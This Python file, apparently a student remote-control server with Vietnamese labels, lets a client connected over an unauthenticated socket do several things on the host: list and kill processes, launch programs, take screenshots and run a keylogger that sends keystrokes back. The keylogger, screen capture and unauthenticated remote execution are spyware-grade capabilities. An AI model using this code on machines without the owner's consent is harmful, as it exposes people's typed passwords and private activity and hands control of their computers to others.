import socket
import threading
import tkinter as tk
from tkinter import messagebox
import psutil
import subprocess
from subprocess import Popen,CREATE_NEW_CONSOLE
from pynput.keyboard import Listener
import logging
import os
import pyautogui
from PIL import Image, ImageTk


HOST = socket.gethostbyname(socket.gethostname())
PORT = 5050
HEADER = 64
FORMAT = 'utf-8'
ADDR = (HOST,PORT)
DIR = os.getcwd() + "/Server/"

SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#Send message to clients
def send(client,msg):
    message = msg.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    try:
        client.send(send_length)
        client.send(message)
    except socket.error:
        raise socket.error

#Receive message from clients
def receive(conn): 
    msg = ""
    try:
        msg_length = conn.recv(HEADER).decode(FORMAT)
    except socket.error:
        return "QUIT"
    else:   
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length).decode(FORMAT)
        return msg    
       
def process_menu(conn):
    def xem(conn):
        list_process = []
        countProcess = 0
        for proc in psutil.process_iter():
            countProcess += 1
            proc_dict = proc.as_dict(['name','pid','num_threads'])
            list_process.append(proc_dict)         
        """Gửi process qua client"""
        send(conn,str(countProcess))
        for proc in list_process:
            name = proc['name']
            send(conn,name)
            id = proc['pid']
            send(conn,str(id))
            threads = proc['num_threads']
            send(conn,str(threads))
        
    def kill(conn):
        def killID(conn):
            msg = receive(conn)
            success = False
            if msg:
                for proc in psutil.process_iter():
                    if str(proc.pid) == msg:
                        try:
                            proc.kill()
                            send(conn,"Đã diệt Process")
                        except psutil.Error:
                            send(conn,"Lỗi")
                        else:
                            success = True
                            break
                
            if success == False:
                send(conn,"Không tìm thấy chương trình")
                return 
        test = True
        while test:
            msg = receive(conn) 
            if msg == "QUIT":
                test = False 
            else:
                killID(conn)
        return 

    def start(conn):
        test = True
        while test:
            msg = receive(conn)
            if msg=="QUIT":
                test = False 
            elif msg == "STARTID":
                name = receive(conn)
                if name: 
                    name+=".exe"
                    try:
                        Popen([name],creationflags=CREATE_NEW_CONSOLE)
                        send(conn,"Process đã được bật")
                    except:
                        send(conn,"Lỗi") 
                else:        
                    send(conn,"Lỗi") 
                
    while True:
        ss = receive(conn)
        switcher={
            "XEM":xem,
            "KILL":kill,
            "START":start,
        }
        if ss == "QUIT":
            return
        func = switcher.get(ss, lambda args: "QUIT")
        func(conn)

def application_menu(conn):
    def xem(conn):
        list_process = []
        countProcess = 0
        str_list = []
        cmd = 'powershell "gps | where {$_.MainWindowTitle } | select Description,Id'
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        for line in proc.stdout:
            if not line.decode()[0].isspace():
                countProcess += 1
                str_list.append(line.decode().rstrip())

        str_list.pop(0)
        str_list.pop(0)
        for i in str_list:
            id = i.rsplit(' ',1)
            proc = psutil.Process(int(id[1]))
            proc_dict = proc.as_dict(['name','pid','num_threads'])
            list_process.append(proc_dict)
            
        send(conn,str(countProcess - 2))
        for proc in list_process:
            name = proc['name']
            send(conn,name)
            id = proc['pid']
            send(conn,str(id))
            threads = proc['num_threads']
            send(conn,str(threads))
        
    def kill(conn):
        def killID(conn):
            msg = receive(conn)
            success = False
            if msg:
                for proc in psutil.process_iter():
                    if str(proc.pid) == msg:
                        try:
                            proc.kill()
                            send(conn,"Đã diệt Process")
                        except psutil.Error:
                            send(conn,"Lỗi")
                        else:
                            success = True
                            break
                
            if success == False:
                send(conn,"Không tìm thấy chương trình")
                return 
        test = True
        while test:
            msg = receive(conn) 
            if msg == "QUIT":
                test = False 
            else:
                killID(conn)
        return 

    def start(conn):
        test = True
        while test:
            msg = receive(conn)
            if msg=="QUIT":
                test = False 
            elif msg == "STARTID":
                name = receive(conn) 
                if name: 
                    name+=".exe"
                    try:
                        Popen([name],creationflags=CREATE_NEW_CONSOLE)
                        send(conn,"Process đã được bật")
                    except:
                        send(conn,"Lỗi") 
                else:        
                    send(conn,"Lỗi") 
                    
    while True:
        ss = receive(conn)
        switcher={
            "XEM":xem,
            "KILL":kill,
            "START":start,
        }
        if ss == "QUIT":
            return
        func = switcher.get(ss, lambda args: "QUIT")
        func(conn)

def key_log(conn):
    def printKeys(conn):
        with open(DIR + "keyLog.txt","r") as file:
            s = file.read()
        with open(DIR + "keyLog.txt","w") as file:
            file.write("")
        if s == "":
            s = "\0"
        send(conn, s)

    def get_keys(stop):
        def writeFile(key):
            with open(DIR + "keyLog.txt","a") as f:
                k= str(key).replace("'","") 
                if k.find("backspace") > 0:
                    f.write("Backspace")
                elif k.find("space") > 0:
                    f.write(" ")
                elif k.find("enter") > 0:
                    f.write("Enter\n")
                elif k.find("tab") > 0:
                    f.write("Tab\t")
                elif k.find("x") > 0:
                    f.write("")
                elif k.find("Key") == -1:
                    f.write(k)  
                
        def on_press(key):
            return
        def on_release(key):
            if key:
                writeFile(key) 
                return False
        while True:
            with Listener(on_press=on_press,on_release=on_release) as listener:
                listener.join()
            if stop():
                break
            
    def hookKey():
        global stop_threads,t
        stop_threads = False
        t = threading.Thread(target= get_keys,args=(lambda : stop_threads, ))
        t.start()
        with open(DIR + "keyLog.txt","w") as f:
            f.write("")
        
    def unHook():   
        global stop_threads
        stop_threads = True
        t.join() 
        with open(DIR + "keyLog.txt","w") as f:
            f.write("")
        
    while True:
        ss = receive(conn)
        if ss == "PRINT":
            printKeys(conn)
        elif ss == "HOOK":
            hookKey()
        elif ss == "UNHOOK":
            unHook()
        elif ss == "QUIT":
            return        
    
def takeScreenshot(conn):
    img = pyautogui.screenshot()
    
    length_img = len(img.tobytes())
    send(conn,str(length_img))
    send(conn,str(img.size))
    send(conn,str(img.mode))
    
    conn.send(img.tobytes())
    
    return  
def take_pic(conn):
    while True:
        ss = receive(conn)
        if ss == "TAKE":
            takeScreenshot(conn)
        elif ss == "QUIT":
            return

def handle_client(conn,addr):
    while True:
        msg = receive(conn)
        print(msg)
        if msg == "KEYLOG":
            key_log(conn)
            #keylog()
            pass
        elif msg == "SHUTDOWN":
            #shutdown()
            pass
        elif msg == "REGISTRY":
            #registry()
            pass
        elif msg == "TAKEPIC":
            take_pic(conn)
            pass
        elif msg == "PROCESS":
            process_menu(conn)
        elif msg == "APPLICATION":
            application_menu(conn)
        elif msg == "QUIT":
            break
            
def accept_incoming_connections():
    try:
        SERVER.bind(ADDR)
        SERVER.listen(5)
        print(f"Listen on {HOST}")
        conn,addr = SERVER.accept()
    except socket.error:
        return
    else:  
        handle_client(conn,addr)
 
def on_closing():
    #SERVER.shutdown(socket.SHUT_RDWR)
    
    if SERVER.fileno() != -1:
        SERVER.close()      
    root.destroy()  
    
root = tk.Tk()
root.title("SERVER")
root.geometry("200x100")
connect = tk.Button(root,
          text= "Mở server",
          command = lambda : threading.Thread(target = accept_incoming_connections).start(),
          height =5,
          width = 10,
         )

connect.pack()
root.protocol("WM_DELETE_WINDOW",on_closing) 
if __name__ == '__main__': 
    root.mainloop()


    

